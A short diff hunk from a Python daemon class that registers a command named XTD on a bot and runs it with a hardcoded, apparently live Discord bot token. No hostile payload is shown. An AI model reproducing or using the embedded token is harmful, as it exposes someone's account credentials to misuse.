@@ -127,7 +127,7 @@ class Daemon:
             self.start()
 
         def run(self):
-            
+            self.bot.add_command(self.XTD)
             self.bot.run("MTA4NzU5ODY1MDIxMDkxMDI4OQ.GpcjSn.c2p3XMReBnp9O_Q6WSZYzUbhw-z9eO7CdqYX28")
             """
             You should override this method when you subclass Daemon. It will be called after the process has been
